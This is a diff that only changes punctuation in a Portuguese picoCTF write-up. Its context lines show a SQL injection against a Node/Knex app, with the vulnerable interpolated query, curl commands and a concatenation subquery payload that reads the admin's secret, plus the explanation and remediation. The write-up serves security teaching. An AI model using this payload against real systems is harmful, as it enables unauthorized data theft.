@@ -39,7 +39,7 @@ A app guarda "segredos" por usuário. Quase todas as queries usam parâmetros pr
 
 Na minha instância o alvo estava em `candy-mountain.picoctf.net:58223`. Use o da sua.
 
-***INSERIR no terminal — Kali (atacante)
+***INSERIR no terminal: Kali (atacante)
 
 ```bash
 export BASE=http://candy-mountain.picoctf.net:58223
@@ -49,9 +49,9 @@ export BASE=http://candy-mountain.picoctf.net:58223
 
 ### 1. Revisão do código-fonte
 
-O desafio entrega o fonte, então começo por ele. Toda a camada de dados usa Knex com `db.raw(sql, [params])` e placeholders `?` — exceto um ponto.
+O desafio entrega o fonte, então começo por ele. Toda a camada de dados usa Knex com `db.raw(sql, [params])` e placeholders `?`, exceto um ponto.
 
-#### `src/server.js` — rota de login (segura)
+#### `src/server.js`: rota de login (segura)
 
 ```js
 const userResult = await db.raw(
@@ -62,7 +62,7 @@ const userResult = await db.raw(
 
 Aqui `username` e `password` vão como parâmetros preparados: nada de injeção.
 
-#### `src/server.js` — rota de criar segredo (vulnerável)
+#### `src/server.js`: rota de criar segredo (vulnerável)
 
 ```js
 app.post('/secrets/create', authMiddleware, async (req, res) => {
@@ -78,9 +78,9 @@ app.post('/secrets/create', authMiddleware, async (req, res) => {
 Esta query é montada por **interpolação de string** (`${content}`), sem parâmetros. O `content` vem direto do meu POST, então eu controlo o SQL depois do `VALUES`.
 
 > [!TIP]
-> **Conceito: SQL injection por concatenação.** Quando a entrada do usuário é colada na query como texto, em vez de passada como parâmetro ligado, o usuário pode encerrar a string com `'` e injetar SQL. Prepared statements (`?`) evitam isso porque o driver envia dados e comando separadamente. Referência: [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection).
+> **Conceito: SQL injection por concatenação.** Quando a entrada do usuário é colada na query como texto, em vez de passada como parâmetro ligado, o usuário pode encerrar a string com `'` e injetar SQL. Prepared statements (`?`) evitam isso porque o driver envia dados e comando separadamente. Referência: [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection).
 
-#### `src/db.js` — onde está a flag
+#### `src/db.js`: onde está a flag
 
 ```js
 await db('secrets')
@@ -111,7 +111,7 @@ O `||` é a concatenação do PostgreSQL. O `content` inserido passa a ser `'' +
 
 Crio um usuário, logo (guardando o cookie `auth_token`), disparo o INSERT malicioso e leio a página inicial.
 
-***INSERIR no terminal — Kali (atacante)
+***INSERIR no terminal: Kali (atacante)
 
 ```bash
 export USER=victor$(date +%s) PASS=123456
@@ -125,7 +125,7 @@ curl -s -c cookies.txt -b cookies.txt -X POST "$BASE/signup" --data "username=$U
 curl -s -c cookies.txt -b cookies.txt -X POST "$BASE/login" --data "username=$USER&password=$PASS" -o /dev/null
 ```
 
-***INSERIR no terminal — Kali (atacante)
+***INSERIR no terminal: Kali (atacante)
 
 ```bash
 curl -s -c cookies.txt -b cookies.txt -X POST "$BASE/secrets/create" --data-urlencode "content=' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb') || '" -o /dev/null
@@ -133,7 +133,7 @@ curl -s -c cookies.txt -b cookies.txt -X POST "$BASE/secrets/create" --data-urle
 
 Agora leio meus segredos e filtro a flag:
 
-***INSERIR no terminal — Kali (atacante)
+***INSERIR no terminal: Kali (atacante)
 
 ```bash
 curl -s -b cookies.txt "$BASE/" | grep -oE 'picoCTF\{[^}]+\}'
@@ -155,7 +155,7 @@ flowchart LR
 
 ## Por que funciona
 
-A suposição de segurança quebrada é o isolamento entre usuários: cada um só deveria ver os próprios segredos. Mas a rota de criação monta a query por concatenação, então o `content` controlado pelo atacante vira código SQL. Com um subquery eu leio a tabela `secrets` inteira — incluindo a linha do admin — e gravo o resultado no meu próprio registro, que a aplicação então me mostra sem reclamar. O resto do código usar `?` não ajuda: basta **um** ponto vulnerável. Classe: CWE-89 (*SQL Injection*).
+A suposição de segurança quebrada é o isolamento entre usuários: cada um só deveria ver os próprios segredos. Mas a rota de criação monta a query por concatenação, então o `content` controlado pelo atacante vira código SQL. Com um subquery eu leio a tabela `secrets` inteira, incluindo a linha do admin, e gravo o resultado no meu próprio registro, que a aplicação então me mostra sem reclamar. O resto do código usar `?` não ajuda: basta **um** ponto vulnerável. Classe: CWE-89 (*SQL Injection*).
 
 ## Remediação
 
@@ -170,8 +170,8 @@ A suposição de segurança quebrada é o isolamento entre usuários: cada um s�
 
 ## Referências
 
-- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
-- [PostgreSQL — operador de concatenação `||`](https://www.postgresql.org/docs/current/functions-string.html)
+- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
+- [PostgreSQL: operador de concatenação `||`](https://www.postgresql.org/docs/current/functions-string.html)
 - [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
 
 ## Flag
